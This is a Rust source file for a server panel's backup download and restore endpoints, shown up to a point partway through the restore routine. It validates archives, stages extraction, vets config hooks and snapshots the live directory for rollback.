use crate::server::web::auth::{self, AuthError};
use axum::body::{Body, Bytes};
use axum::http::{header, HeaderValue, StatusCode};
use axum::response::{IntoResponse, Response};
use axum::Json;
use serde_json::json;
use std::path::{Component, Path};
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

#[path = "backup/hook_paths.rs"]
mod hook_paths;

const MANAGED_BACKUP_ROOT: &str = "/etc/qeli";
const ARCHIVE_BUDGET: Duration = Duration::from_secs(60);
// Match the upload body limit: never return a portable backup the panel cannot upload.
const PORTABLE_ARCHIVE_LIMIT: usize = super::MAX_BODY_BYTES;
const SNAPSHOT_LIMIT: usize = 64 * 1024 * 1024;
const ARCHIVE_TEXT_LIMIT: usize = 16 * 1024 * 1024;

fn tar_command() -> std::process::Command {
    let mut command = std::process::Command::new("tar");
    // Validation, extraction and snapshots must interpret the same explicit options.
    command
        .env("LC_ALL", "C")
        .env_remove("TAR_OPTIONS")
        .env_remove("GZIP");
    command
}

fn archive_budget(until: Instant) -> Result<(), String> {
    if Instant::now() >= until {
        Err(
            "archive operation timed out before publication; retry after checking server resources"
                .into(),
        )
    } else {
        Ok(())
    }
}

async fn archive_lock(
    state: &std::sync::Arc<crate::server::ServerState>,
    until: Instant,
) -> Result<tokio::sync::OwnedMutexGuard<()>, &'static str> {
    let guard = tokio::time::timeout_at(
        tokio::time::Instant::from_std(until),
        state.config_write_lock.clone().lock_owned(),
    )
    .await
    .map_err(|_| "config is busy; archive operation timed out")?;
    if Instant::now() >= until {
        return Err("config is busy; archive operation timed out");
    }
    Ok(guard)
}
const TRANSIENT_TAR_EXCLUDES: &[&str] = &[
    // Advisory lock inodes are local coordination state, never archive data.
    "qeli/*.lock",
    "qeli/.pre-restore-*.tgz",
    "qeli/.restore-upload-*.tgz",
    "qeli/.restore-staging-*",
];
const PORTABLE_TAR_EXCLUDES: &[&str] = &[
    "qeli/.config-history",
    // The legacy key can remain after migration to /var/lib/qeli. Never export it beside the
    // encrypted password values: the portable archive deliberately excludes encryption keys.
    "qeli/panel-secret.key",
    "qeli/notify.json",
];

fn append_tar_excludes(command: &mut std::process::Command, portable: bool) {
    for pattern in TRANSIENT_TAR_EXCLUDES {
        command.arg(format!("--exclude={pattern}"));
    }
    if portable {
        for pattern in PORTABLE_TAR_EXCLUDES {
            command.arg(format!("--exclude={pattern}"));
        }
    }
}

fn create_archive_command(parent: &Path, portable: bool) -> std::process::Command {
    let mut command = tar_command();
    command.args(["czf", "-", "--xattrs"]);
    // Portable downloads verify required members separately. A rollback snapshot
    // must be complete: even an optional unreadable file makes restoration unsafe.
    if portable {
        command.arg("--ignore-failed-read");
    }
    append_tar_excludes(&mut command, portable);
    command.arg("-C").arg(parent).arg("qeli");
    command
}

fn validate_critical_sources(paths: &[CriticalBackupPath]) -> Result<(), String> {
    for item in paths {
        let path = Path::new("/etc").join(&item.archive_path);
        let metadata = std::fs::symlink_metadata(&path).map_err(|error| {
            format!(
                "backup aborted: '{}' is unavailable ({}) — {error}",
                path.display(),
                item.reason
            )
        })?;
        if !metadata.file_type().is_file() {
            return Err(format!(
                "backup aborted: '{}' is not a regular file ({})",
                path.display(),
                item.reason
            ));
        }
        std::fs::File::open(&path).map_err(|error| {
            format!(
                "backup aborted: '{}' is unreadable ({}) — {error}",
                path.display(),
                item.reason
            )
        })?;
    }
    Ok(())
}

fn inspect_backup_archive(
    bytes: Vec<u8>,
    until: Instant,
) -> Result<(Vec<u8>, std::collections::HashSet<String>), String> {
    let mut command = tar_command();
    command.args(["tzf", "-"]);
    let listing = crate::system_command::Command::from(command)
        .output_bounded(until, ARCHIVE_TEXT_LIMIT, Some(&bytes))
        .map_err(|error| format!("cannot inspect generated backup: {error}"))?;
    if !listing.status.success() {
        return Err(format!(
            "generated backup cannot be listed: {}",
            String::from_utf8_lossy(&listing.stderr).trim()
        ));
    }
    let members = String::from_utf8_lossy(&listing.stdout)
        .lines()
        .map(|line| {
            line.trim()
                .trim_start_matches("./")
                .trim_end_matches('/')
                .to_string()
        })
        .filter(|line| !line.is_empty())
        .collect();
    Ok((bytes, members))
}

fn read_backup_member(
    bytes: Vec<u8>,
    member: &str,
    until: Instant,
) -> Result<(Vec<u8>, String), String> {
    let mut command = tar_command();
    command.args(["xOzf", "-", "--", member]);
    let output = crate::system_command::Command::from(command)
        .output_bounded(until, ARCHIVE_TEXT_LIMIT, Some(&bytes))
        .map_err(|error| format!("cannot read archived configuration: {error}"))?;
    if !output.status.success() {
        return Err(format!(
            "cannot read archived configuration: {}",
            String::from_utf8_lossy(&output.stderr)
        ));
    }
    let raw = String::from_utf8(output.stdout)
        .map_err(|error| format!("archived configuration is not UTF-8: {error}"))?;
    Ok((bytes, raw))
}

#[derive(Debug)]
struct CriticalBackupPath {
    archive_path: String,
    reason: &'static str,
}

/// Map an active configuration path to the member name used by the portable panel archive.
/// The panel archive deliberately has one managed root. Silently accepting a path outside
/// that root is worse than refusing the operation: the resulting archive looks complete but
/// cannot reproduce the running server.
fn managed_archive_path(path: &str, label: &str) -> Result<String, String> {
    let path = Path::new(path);
    if !path.is_absolute() {
        return Err(format!(
            "panel backup unavailable: active {label} path '{}' is relative; move it below {MANAGED_BACKUP_ROOT} or take a manual backup",
            path.display()
        ));
    }
    let relative = path.strip_prefix(MANAGED_BACKUP_ROOT).map_err(|_| {
        format!(
            "panel backup unavailable: active {label} path '{}' is outside {MANAGED_BACKUP_ROOT}; the panel will not claim that a partial archive is complete. Move it below {MANAGED_BACKUP_ROOT} or take a manual backup that includes the external path",
            path.display()
        )
    })?;
    if relative.as_os_str().is_empty()
        || !relative
            .components()
            .all(|component| matches!(component, Component::Normal(_)))
    {
        return Err(format!(
            "panel backup unavailable: active {label} path '{}' is not a normal file below {MANAGED_BACKUP_ROOT}",
            path.display()
        ));
    }
    Ok(format!(
        "qeli/{}",
        relative.to_string_lossy().replace('\\', "/")
    ))
}

fn critical_backup_paths(
    config: &crate::config::server::ServerConfig,
    config_path: &str,
) -> Result<Vec<CriticalBackupPath>, String> {
    let mut paths = vec![CriticalBackupPath {
        archive_path: managed_archive_path(config_path, "server config")?,
        reason: "the active server configuration",
    }];
    paths.push(CriticalBackupPath {
        archive_path: managed_archive_path(&config.auth.users_file, "users database")?,
        reason: "the active users database",
    });
    for profile in &config.profiles {
        paths.push(CriticalBackupPath {
            archive_path: managed_archive_path(
                &crate::server::profile_identity_path(profile),
                &format!("identity key for profile '{}'", profile.name),
            )?,
            reason: "a server identity key; restoring without it would break pinned clients",
        });
    }
    if config.web.enabled && config.web.tls {
        for (path, label) in [
            (
                if config.web.tls_cert.is_empty() {
                    "/etc/qeli/web-tls-cert.pem"
                } else {
                    &config.web.tls_cert
                },
                "panel TLS certificate",
            ),
            (
                if config.web.tls_key.is_empty() {
                    "/etc/qeli/web-tls-key.pem"
                } else {
                    &config.web.tls_key
                },
                "panel TLS private key",
            ),
        ] {
            paths.push(CriticalBackupPath {
                archive_path: managed_archive_path(path, label)?,
                reason: "the active panel TLS material",
            });
        }
    }
    paths.sort_by(|a, b| a.archive_path.cmp(&b.archive_path));
    paths.dedup_by(|a, b| a.archive_path == b.archive_path);
    Ok(paths)
}

// File reads/stat/open and parsing run while the worker retains the config write lease.
fn backup_preflight(
    config_path: &str,
    until: Instant,
) -> Result<(String, String), (StatusCode, String)> {
    let internal = |error: String| (StatusCode::INTERNAL_SERVER_ERROR, error);
    let conflict = |error: String| (StatusCode::CONFLICT, error);
    archive_budget(until).map_err(internal)?;
    // The shared loader refuses special files without waiting on FIFO open and
    // verifies one stable inode snapshot and enforces the worker's INI size limit.
    let (current_raw, _) = crate::config_source::load(config_path)
        .map_err(|error| internal(error.to_string()))?
        .into_parts();
    archive_budget(until).map_err(internal)?;
    let config = crate::config::parse_server_config(&current_raw)
        .map_err(|error| conflict(error.to_string()))?;
    let critical_paths = critical_backup_paths(&config, config_path).map_err(conflict)?;
    validate_critical_sources(&critical_paths).map_err(internal)?;
    let archived_path = managed_archive_path(config_path, "server config").map_err(conflict)?;
    archive_budget(until).map_err(internal)?;
    Ok((current_raw, archived_path))
}

/// Stream a gzip tarball of `/etc/qeli` (config + users file + identity keys) for
/// off-box backup. Authed-admin only; a GET so the browser downloads it straight
/// to disk carrying the session cookie. Restore = extract it back into `/etc`
/// (`tar xzf qeli-backup-*.tar.gz -C /etc`) and restart.
pub async fn download_backup(
    axum::extract::State(state): axum::extract::State<std::sync::Arc<crate::server::ServerState>>,
    _guard: auth::AuthGuard,
) -> Result<Response, AuthError> {
    let until = Instant::now() + ARCHIVE_BUDGET;
    let write_guard = match archive_lock(&state, until).await {
        Ok(guard) => guard,
        Err(error) => return Ok((StatusCode::CONFLICT, error).into_response()),
    };
    let config_path = state
        .config_path
        .lock()
        .await
        .clone()
        .unwrap_or_else(|| "/etc/qeli/server.conf".to_string());
    let worker_path = config_path.clone();
    let out = crate::config_transaction::blocking(write_guard, move || {
        let (current_raw, archived_config_path) = backup_preflight(&worker_path, until)?;
        // Non-critical local artefacts may be unreadable; required members are verified below.
        let command = create_archive_command(Path::new("/etc"), true);
        let output = crate::system_command::Command::from(command)
            .output_bounded(until, PORTABLE_ARCHIVE_LIMIT, None)
            .map_err(|error| {
                (
                    StatusCode::INTERNAL_SERVER_ERROR,
                    format!("tar execution failed: {error}"),
                )
            })?;
        Ok::<_, (StatusCode, String)>((output, current_raw, archived_config_path))
    })
    .await;

    // tar exits non-zero (1/2) when it skipped unreadable files, yet still produces
    // a valid archive — accept any non-empty gzip stream (magic 1f 8b).
    let is_gzip = |b: &[u8]| b.len() > 2 && b[0] == 0x1f && b[1] == 0x8b;
    let (write_guard, (o, current_raw, archived_config_path)) = match out {
        Ok((guard, Ok(output))) => (guard, output),
        Ok((_, Err((status, message)))) => return Ok((status, message).into_response()),
        Err(e) => {
            return Ok((
                StatusCode::INTERNAL_SERVER_ERROR,
                format!("task error: {e}"),
            )
                .into_response())
        }
    };
    if !is_gzip(&o.stdout) {
        return Ok((
            StatusCode::INTERNAL_SERVER_ERROR,
            format!("tar failed: {}", String::from_utf8_lossy(&o.stderr)),
        )
            .into_response());
    }
    // Do not infer completeness from tar stderr: an already-missing path need not be named.
    // List the archive that will actually be returned and require every runtime dependency.
    let tar_stderr = String::from_utf8_lossy(&o.stderr).trim().to_string();
    let inspected =
        crate::config_transaction::blocking(write_guard, move || -> Result<_, String> {
            let (bytes, members) = inspect_backup_archive(o.stdout, until)?;
            let (bytes, archived_raw) = read_backup_member(bytes, &archived_config_path, until)?;
            if archived_raw != current_raw {
                return Err(
                    "server config changed while creating backup; retry the download".into(),
                );
            }
            let config = crate::config::parse_server_config(&archived_raw)
                .map_err(|error| format!("archived server config is invalid: {error}"))?;
            let required = critical_backup_paths(&config, &config_path)?;
            Ok((bytes, members, required))
        })
        .await;
    let (bytes, members, critical_paths) = match inspected {
        Ok((_, Ok(value))) => value,
        Ok((_, Err(error))) => {
            return Ok((StatusCode::INTERNAL_SERVER_ERROR, error).into_response())
        }
        Err(error) => {
            return Ok((
                StatusCode::INTERNAL_SERVER_ERROR,
                format!("backup verification task failed: {error}"),
            )
                .into_response())
        }
    };
    if let Some(item) = critical_paths
        .iter()
        .find(|item| !members.contains(&item.archive_path))
    {
        return Ok((
            StatusCode::INTERNAL_SERVER_ERROR,
            format!(
                "backup aborted: '{}' is MISSING from the generated archive ({}). tar: {}",
                item.archive_path, item.reason, tar_stderr
            ),
        )
            .into_response());
    }

    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    let fname = format!("qeli-backup-{ts}.tar.gz");
    let mut resp = Response::new(Body::from(bytes));
    let h = resp.headers_mut();
    h.insert(
        header::CONTENT_TYPE,
        HeaderValue::from_static("application/gzip"),
    );
    if let Ok(v) = HeaderValue::from_str(&format!("attachment; filename=\"{fname}\"")) {
        h.insert(header::CONTENT_DISPOSITION, v);
    }
    Ok(resp)
}

/// Query string for `POST /api/restore`. (Р1)
#[derive(serde::Deserialize)]
pub struct RestoreQuery {
    /// `true`/`1` → exact restore: files present in /etc/qeli but absent from the archive
    /// are DELETED, so the result matches the backup rather than being a union with it.
    /// Absent/false → overlay (the historical, non-destructive behaviour).
    #[serde(default, deserialize_with = "de_flexible_bool")]
    pub exact: Option<bool>,
}

/// Accept `1/0`, `true/false`, `yes/no` — a query param arrives as a string, and
/// `?exact=1` is what a curl user will type.
fn de_flexible_bool<'de, D>(d: D) -> Result<Option<bool>, D::Error>
where
    D: serde::Deserializer<'de>,
{
    use serde::Deserialize as _;
    let s = Option::<String>::deserialize(d)?;
    s.map(|v| match v.trim().to_ascii_lowercase().as_str() {
        "1" | "true" | "yes" | "on" => Ok(true),
        "0" | "false" | "no" | "off" => Ok(false),
        _ => Err(serde::de::Error::custom(
            "exact must be true/false, 1/0, yes/no or on/off",
        )),
    })
    .transpose()
}

/// Sentinel for "a restore is already running" so the handler can answer 409 without
/// re-deriving it from prose. (S-08)
const RESTORE_BUSY: &str = "another restore is already in progress — retry once it finishes";

/// Failures that are the SERVER's fault (it could not run tar, create the staging dir,
/// or publish) rather than the uploaded archive's. Everything else a restore rejects is
/// a property of the upload — bad gzip, traversal, empty, refused content — and is a
/// 400. Listed in one place instead of threading a status through ~15 return sites; the
/// strings are ours and live next to the code that emits them. (S-13)
const SERVER_FAULT_MARKERS: &[&str] = &[
    "archive operation timed out",
    "write temp file",
    "tar list failed",
    "tar extract execution failed",
    "extract failed:",
    "cannot lock runtime dependency for restore",
    "cannot lock server config for restore",
    "cannot create the staging directory",
    "publishing the restored files failed",
    "could not run tar for the pre-restore snapshot",
    "could not take the pre-restore snapshot",
    "staged tree unreadable",
    "cannot inspect staged entry",
    "cannot normalize restored config/key permissions",
];

fn restore_lock_error(prefix: &str, error: anyhow::Error) -> String {
    // FileLock distinguishes bounded flock contention from open/stat/trust/I/O errors.
    // Match its error prefix, never arbitrary text from a configured pathname.
    let detail = error.to_string();
    if detail.starts_with("timed out waiting for lock ") {
        format!("restore lock contention: {prefix}: {detail}")
    } else {
        format!("{prefix}: {detail}")
    }
}

fn restore_error_status(msg: &str) -> StatusCode {
    if msg == RESTORE_BUSY || msg.starts_with("restore lock contention:") {
        StatusCode::CONFLICT
    } else if SERVER_FAULT_MARKERS.iter().any(|m| msg.contains(m)) {
        StatusCode::INTERNAL_SERVER_ERROR
    } else {
        StatusCode::BAD_REQUEST
    }
}

/// Restore `/etc/qeli` from an uploaded backup `.tar.gz` (the file produced by
/// `download_backup`). The body is the raw gzip. Before extracting it validates
/// the archive is a gzip whose entries ALL live under `qeli/` (no absolute paths
/// or `..` traversal), then snapshots the current directory to a pre-restore
/// archive so the change is reversible. The worker must be restarted to apply.
///
/// NOTE: extraction is an OVERLAY — files present in the live directory but absent
/// from the archive are left in place, not deleted (see the success message). (S-13)
pub async fn restore_backup(
    axum::extract::State(state): axum::extract::State<std::sync::Arc<crate::server::ServerState>>,
    _guard: auth::AuthGuard,
    axum::extract::Query(q): axum::extract::Query<RestoreQuery>,
    body: Bytes,
) -> Result<Response, AuthError> {
    // Reserve before waiting for a config writer: a second restore must not queue
    // behind the first and unexpectedly overwrite its result afterwards.
    let restore_guard = match RESTORE_LOCK.try_lock() {
        Ok(guard) => guard,
        Err(_) => {
            return Ok((
                StatusCode::CONFLICT,
                Json(json!({"ok": false, "error": RESTORE_BUSY})),
            )
                .into_response())
        }
    };
    let until = Instant::now() + ARCHIVE_BUDGET;
    let write_guard = match archive_lock(&state, until).await {
        Ok(guard) => guard,
        Err(error) => return Ok((StatusCode::CONFLICT, error).into_response()),
    };
    let config_path = state
        .config_path
        .lock()
        .await
        .clone()
        .unwrap_or_else(|| "/etc/qeli/server.conf".to_string());
    // Restore must also repair a corrupt live config. Validate the destination here;
    // the uploaded config and its dependencies are validated in staging before publish.
    if let Err(error) = managed_archive_path(&config_path, "server config") {
        return Ok((
            StatusCode::CONFLICT,
            Json(json!({
                "ok": false,
                "error": format!("restore unavailable: {error}")
            })),
        )
            .into_response());
    }
    // A restore replaces the same files as Configuration/Quick Start. Keep it mutually
    // exclusive with those read-modify-write operations so neither can publish a stale tree
    // over the other while extraction and validation are in progress.
    // `?exact=1` opts into deleting live files the archive does not contain. Default stays
    // OVERLAY: exact restore removes data, and that must never be what a plain "Restore"
    // click does. (Р1)
    let exact = q.exact.unwrap_or(false);
    let retained_hooks = state.retained_restore_hooks();
    let result = crate::config_transaction::blocking(write_guard, move || {
        let _restore_guard = restore_guard;
        restore_blocking(&body, exact, &config_path, until, &retained_hooks)
    })
    .await;
    // A failed restore used to answer 200 {ok:false}: the panel rendered the error, but
    // every non-browser caller (curl, a deploy script, uptime monitoring) read "success".
    // The body shape is unchanged — the panel's apiFetch parses JSON on any status. (S-13)
    let (status, payload) = match result {
        Ok((_, Ok(msg))) => {
            // Notify (Tier-3): a successful restore changed /etc/qeli on disk.
            crate::server::notify::fire(
                crate::server::notify::Event::Restore,
                "config restored from an uploaded backup",
            );
            (StatusCode::OK, json!({ "ok": true, "message": msg }))
        }
        Ok((_, Err(e))) => (
            restore_error_status(&e.error),
            json!({
                "ok": false, "error": e.error, "publication_started": e.publication_started,
                "rollback_snapshot": e.rollback_snapshot
            }),
        ),
        Err(e) => (
            StatusCode::INTERNAL_SERVER_ERROR,
            json!({ "ok": false, "error": format!("task error: {e}") }),
        ),
    };
    Ok((status, Json(payload)).into_response())
}

/// Immediate restore admission precedes config locking. The blocking worker owns
/// this guard once dispatched, so request cancellation cannot admit another restore.
static RESTORE_LOCK: tokio::sync::Mutex<()> = tokio::sync::Mutex::const_new(());

/// Distinguishes restores that start within the same second (the old names used only a
/// unix-seconds stamp, and the temp file added a pid that is identical for two requests
/// in the same process — so both collided). (S-08)
static RESTORE_SEQ: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);

/// Delete everything in `/etc/qeli` that the archive did not contain, so the result is
/// the backup rather than a union of the backup and whatever is live. (Р1)
///
/// Skips, deliberately:
///  * `.pre-restore-*.tgz` — the snapshot taken moments ago is the ONLY way back from a
///    bad exact restore. Deleting our own safety net would be self-defeating.
///  * `.restore-upload-*` / `.restore-staging-*` — in-flight artefacts of this or a
///    concurrent operation, never part of a backup.
///  * dotfiles and *.lock files are left alone: they are operational state, and
///    a backup has no authority to unlink an active advisory-lock inode.
///
/// Returns the number of entries removed and cleanup errors. The caller reports
/// failure with recovery metadata when publication has succeeded but cleanup has not.
///
/// `archive_names` MUST be captured BEFORE publishing. `publish_staged_tree` moves entries
/// out of the staging directory with `fs::rename`, so by the time this runs the staging
/// tree no longer contains the files it just delivered. Testing "is it still in staging?"
/// therefore answered "no" for everything and deleted `server.conf`, `users.conf` and
/// profile identity keys moments after restoring them — while the endpoint reported success.
fn prune_absent(
    archive_names: &std::collections::HashSet<String>,
    dest: &str,
) -> (usize, Vec<String>) {
    let mut removed = 0usize;
    let mut errors = Vec::new();
    // Fail closed: with no idea what the archive held, deleting "everything not in it"
    // would delete everything.
    if archive_names.is_empty() {
        return (
            0,
            vec!["refusing to prune: the archive's file list is empty/unreadable".into()],
        );
    }
    let entries = match std::fs::read_dir(dest) {
        Ok(e) => e,
        Err(e) => return (0, vec![format!("cannot scan {dest}: {e}")]),
    };
    for entry in entries {
        let entry = match entry {
            Ok(entry) => entry,
            Err(error) => {
                errors.push(format!("cannot inspect live directory entry: {error}"));
                continue;
            }
        };
        let name = entry.file_name().to_string_lossy().to_string();
        if name.starts_with('.') || name.ends_with(".lock") {
            continue; // snapshots, in-flight artefacts and sidecar writer locks
        }
        if archive_names.contains(&name) {
            continue; // present in the archive — keep (publish already overwrote it)
        }
        prune_absent_entry(&entry.path(), &mut removed, &mut errors);
    }
    (removed, errors)
}

fn prune_absent_entry(path: &Path, removed: &mut usize, errors: &mut Vec<String>) {
    let result = (|| -> std::io::Result<()> {
        let metadata = std::fs::symlink_metadata(path)?;
        if metadata.is_dir() {
            for entry in std::fs::read_dir(path)? {
                let entry = entry?;
                let name = entry.file_name();
                let name = name.to_string_lossy();
                if !name.starts_with('.') && !name.ends_with(".lock") {
                    prune_absent_entry(&entry.path(), removed, errors);
                }
            }
            match std::fs::remove_dir(path) {
                Ok(()) => *removed += 1,
                Err(error) if error.kind() == std::io::ErrorKind::DirectoryNotEmpty => {}
                Err(error) => return Err(error),
            }
        } else {
            std::fs::remove_file(path)?;
            *removed += 1;
        }
        Ok(())
    })();
    if let Err(error) = result {
        errors.push(format!("{}: {error}", path.display()));
    }
}

#[path = "backup_listing.rs"]
mod listing;

#[derive(Debug)]
struct RestoreFailure {
    error: String,
    publication_started: bool,
    rollback_snapshot: Option<String>,
}
impl From<String> for RestoreFailure {
    fn from(error: String) -> Self {
        Self {
            error,
            publication_started: false,
            rollback_snapshot: None,
        }
    }
}
impl From<&str> for RestoreFailure {
    fn from(error: &str) -> Self {
        error.to_owned().into()
    }
}

fn lock_restore_dependencies(
    root: &Path,
    config_path: &str,
    until: Instant,
) -> Result<Vec<crate::util::FileLock>, String> {
    let mut paths = std::collections::BTreeSet::new();
    let relative = qeli_relative_path(config_path).ok_or("invalid active config path")?;
    let staged = crate::server::read_config_text(root.join(relative)).map_err(|e| e.to_string())?;
    let candidate = crate::config::parse_server_config(&staged).map_err(|e| e.to_string())?;
    let current = crate::server::read_config_text(config_path)
        .ok()
        .and_then(|raw| crate::config::parse_server_config(&raw).ok());
    for config in std::iter::once(&candidate).chain(current.as_ref()) {
        paths.insert(config.auth.users_file.clone());
        for profile in &config.profiles {
            paths.insert(crate::server::profile_identity_path(profile));
        }
    }
    let active = std::fs::canonicalize(config_path).unwrap_or_else(|_| config_path.into());
    let mut guards = Vec::new();
    let mut locked = std::collections::BTreeSet::new();
    for path in paths {
        // External dependencies are inspected, but restore cannot publish/prune them.
        if qeli_relative_path(&path).is_none() {
            continue;
        }
        let target = std::fs::canonicalize(&path).unwrap_or_else(|_| path.into());
        if target == active || !locked.insert(target.clone()) {
            continue;
        } // already held by restore_blocking
        if let Some(parent) = target.parent() {
            use std::os::unix::fs::DirBuilderExt;
            std::fs::DirBuilder::new()
                .recursive(true)
                .mode(0o700)
                .create(parent)
                .map_err(|error| {
                    format!(
                        "cannot lock runtime dependency for restore '{}': {error}",
                        target.display()
                    )
                })?;
        }
        let wait = until
            .saturating_duration_since(Instant::now())
            .min(Duration::from_secs(5));
        guards.push(
            crate::util::FileLock::acquire_timeout(&target, wait).map_err(|error| {
                restore_lock_error(
                    &format!(
                        "cannot lock runtime dependency for restore '{}'",
                        target.display()
                    ),
                    error,
                )
            })?,
        );
    }
    Ok(guards)
}

fn restore_blocking(
    data: &[u8],
    exact: bool,
    config_path: &str,
    until: Instant,
    retained_hooks: &[String],
) -> Result<String, RestoreFailure> {
    archive_budget(until)?;
    if data.len() < 3 || data[0] != 0x1f || data[1] != 0x8b {
        return Err("not a gzip archive".into());
    }
    // Share the INI sidecar with panel saves and set-web-password for the
    // entire staging and publication transaction. The restore already runs on
    // a blocking worker; waiting here does not stall the async executor.
    let lock_path = std::fs::canonicalize(config_path)
        .unwrap_or_else(|_| std::path::PathBuf::from(config_path));
    let lock_wait = until
        .saturating_duration_since(Instant::now())
        .min(Duration::from_secs(5));
    let _config_file_guard = crate::util::FileLock::acquire_timeout(&lock_path, lock_wait)
        .map_err(|error| restore_lock_error("cannot lock server config for restore", error))?;
    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    // Unique per restore: seconds + pid + an in-process counter. Every temporary path
    // below (upload, snapshot, staging dir) is derived from this. (S-08)
    let uniq = format!(
        "{ts}-{}-{}",
        std::process::id(),
        RESTORE_SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
    );
    let tmp = &format!("/etc/qeli/.restore-upload-{uniq}.tgz");
    // Born 0600: the uploaded archive contains identity keys + user hashes, so it
    // must not be world-readable in the write window or after a crash.
    crate::util::write_atomic_private(tmp, data).map_err(|e| format!("write temp file: {e}"))?;
    let cleanup = || {
        let _ = std::fs::remove_file(tmp);
    };

    // The listing is consumed with bounded memory, entry/expanded-byte budgets and
    // a deadline. Stop tar (and gzip) before a hostile archive can grow its output.
    let count = match listing::validate_archive(tmp, until) {
        Ok(count) => count,
        Err(error) => {
            cleanup();
            return Err(error.into());
        }
    };

    // Extract into a STAGING directory, never straight into /etc/qeli. The checks above
    // are structural (paths, links, bomb) and say nothing about CONTENT — and content is
    // the dangerous part: `routing.post_up` is run through `/bin/sh -c` at profile start
    // (see hooks.rs), so extracting an attacker's config in place turned an authenticated
    // panel session into command execution on the next restart. It also bypassed the
    // deliberate rule that `PUT /config` enforces — hooks are file-only, the panel may
    // never set them. Staging lets us apply that same rule to a restore before anything
    // reaches the live directory.
    let staging = format!("/etc/qeli/.restore-staging-{uniq}");
    let _ = std::fs::remove_dir_all(&staging);
    // Staging briefly holds the extracted identity keys / user hashes — create it
    // 0700 so no local user can read them out of it mid-restore.
    let mk_staging = {
        #[cfg(unix)]
        {
            use std::os::unix::fs::DirBuilderExt;
            std::fs::DirBuilder::new().mode(0o700).create(&staging)
        }
        #[cfg(not(unix))]
        {
            std::fs::create_dir(&staging)
        }
    };
    if let Err(e) = mk_staging {
        cleanup();
        return Err(format!("cannot create the staging directory: {e}").into());
    }
    let stage_cleanup = || {
        let _ = std::fs::remove_dir_all(&staging);
    };
    let mut command = tar_command();
    // Archive ownership is not authorization: files must belong to this server user.
    command.args(["xzf", tmp, "--no-same-owner", "--xattrs", "-C", &staging]);
    let ex = crate::system_command::Command::from(command).output_bounded(
        until,
        ARCHIVE_TEXT_LIMIT,
        None,
    );
    cleanup();
    match ex {
        Ok(o) if o.status.success() => {}
        Ok(o) => {
            stage_cleanup();
            return Err(format!("extract failed: {}", String::from_utf8_lossy(&o.stderr)).into());
        }
        Err(e) => {
            stage_cleanup();
            return Err(format!("tar extract execution failed: {e}").into());
        }
    }

    let staged_root = format!("{staging}/qeli");
    if let Err(e) = vet_staged_tree_with_hooks(&staged_root, config_path, retained_hooks) {
        stage_cleanup();
        return Err(e.into());
    }
    let network_check = (|| -> Result<(), String> {
        let relative = qeli_relative_path(config_path).ok_or("invalid active config path")?;
        let raw =
            crate::server::read_config_text(std::path::Path::new(&staged_root).join(relative))
                .map_err(|error| error.to_string())?;
        let config = crate::config::parse_server_config(&raw).map_err(|error| error.to_string())?;
        crate::server::preflight::run_until(&config, until).map_err(|error| {
            format!("refused: restored config conflicts with host networking: {error}")
        })
    })();
    if let Err(error) = network_check {
        stage_cleanup();
        return Err(error.into());
    }
    if let Err(error) = normalize_staged_permissions(std::path::Path::new(&staged_root)) {
        stage_cleanup();
        return Err(format!("cannot normalize restored config/key permissions: {error}").into());
    }
    if let Err(e) = vet_publish_shape(
        std::path::Path::new(&staged_root),
        std::path::Path::new("/etc/qeli"),
        exact,
        0,
    ) {
        stage_cleanup();
        return Err(e.into());
    }

    // Snapshot the archive's TOP-LEVEL names BEFORE publishing: publish moves entries out
    // of staging (fs::rename), so afterwards the staging tree is no longer a record of what
    // the archive contained. Reading it later reported "the archive has nothing" and pruned
    // away the very files that had just been restored. (Р1)
    let archive_names: std::collections::HashSet<String> = match std::fs::read_dir(&staged_root) {
        Ok(rd) => {
            let names: std::io::Result<std::collections::HashSet<String>> = rd
                .map(|entry| entry.map(|entry| entry.file_name().to_string_lossy().into_owned()))
                .collect();
            match names {
                Ok(names) => names,
                Err(error) => {
                    stage_cleanup();
                    return Err(format!("staged tree unreadable: {error}").into());
                }
            }
        }
        Err(e) => {
            stage_cleanup();
            return Err(format!("staged tree unreadable: {e}").into());
        }
    };

    if exact {
        let hooks = hook_referenced_files(config_path, retained_hooks);
        if let Err(error) = vet_hook_pruning(&archive_names, Path::new(MANAGED_BACKUP_ROOT), &hooks)
        {
            stage_cleanup();
            return Err(error.into());
        }
    }

    if let Err(error) = archive_budget(until) {
        stage_cleanup();
        return Err(error.into());
    }
    let _dependency_guards =
        match lock_restore_dependencies(Path::new(&staged_root), config_path, until) {
            Ok(guards) => guards,
            Err(error) => {
                stage_cleanup();
                return Err(error.into());
            }
        };
    // Snapshot the current state so a bad restore is reversible. If this fails there is
    // no way back, so refuse the restore rather than proceed unprotected — the whole
    // point of the snapshot is that the operator can undo a bad archive.
    let bak = format!("/etc/qeli/.pre-restore-{uniq}.tgz");
    let snapshot = {
        let command = create_archive_command(Path::new("/etc"), false);
        crate::system_command::Command::from(command).output_bounded(until, SNAPSHOT_LIMIT, None)
    };
    let snapshot = match snapshot {
        Ok(output) if output.status.success() => output,
        Ok(output) => {
            cleanup();
            stage_cleanup();
            return Err(format!(
                "refusing to restore: could not take the pre-restore snapshot ({})",
                String::from_utf8_lossy(&output.stderr).trim()
            )
            .into());
        }
        Err(error) => {
            cleanup();
            stage_cleanup();
            return Err(format!(
                "refusing to restore: could not run tar for the pre-restore snapshot ({error})"
            )
            .into());
        }
    };
    if let Err(error) = crate::util::write_atomic_private(&bak, &snapshot.stdout) {
        cleanup();
        stage_cleanup();
        return Err(format!(
            "refusing to restore: could not take the pre-restore snapshot ({error})"
        )
        .into());
    }
    drop(snapshot);

    if let Err(error) = archive_budget(until) {
        stage_cleanup();
        return Err(error.into());
    }
    // Publication is the commit boundary: do not abandon half a tree just because
    // the preparation deadline expires during filesystem renames.
    // Vetted — publish. Same filesystem, so each rename is atomic; a failure part-way
    // may leave a mix of old and new files. The snapshot supports manual recovery;
    // extracting it alone does not remove newly introduced files.
    if let Err(e) = publish_staged_tree(&staged_root, "/etc/qeli") {
        stage_cleanup();
        return Err(RestoreFailure {
            error: format!("publishing the restored files failed: {e}; live files may be partially restored. Recover from {bak} before restarting"),
            publication_started: true, rollback_snapshot: Some(bak),
        });
    }
